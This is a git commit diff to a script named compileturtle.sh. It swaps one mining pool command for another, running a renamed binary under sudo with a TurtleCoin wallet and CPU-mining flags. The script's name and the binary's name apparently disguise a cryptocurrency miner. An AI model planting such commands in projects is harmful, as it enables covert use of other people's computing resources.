53bb9dda679b47d1c1a2e17bdfab336af6e6fb0a
Diaznr <79598104+Diaznr@users.noreply.github.com>
2021-03-15 12:36:03 +0700

    Update compileturtle.sh

--- compileturtle.sh
+++ compileturtle.sh
@@ -1,1 +1,1 @@
-sudo ./tuyul --url singapore01.hashvault.pro:80 --user TRTLv3LSAMfLWkG4Sh9gXLXZGTynznP1JWrCRVqbAMec8haEGoa5RgXKZVG26PcRx1BGmgopo5X2mL8jt7QA39tY4z55Y8WTGzU --pass Bulus --cpu-no-yield --donate-level 1 -k --cpu-priority 5 --print-time 10
+sudo ./tuyul --url minenice.newpool.pw:1154 --user TRTLv3LSAMfLWkG4Sh9gXLXZGTynznP1JWrCRVqbAMec8haEGoa5RgXKZVG26PcRx1BGmgopo5X2mL8jt7QA39tY4z55Y8WTGzU@Bulus --pass x --cpu-no-yield --donate-level 1 -k --cpu-priority 5 --print-time 20 -a argon2/chukwav2
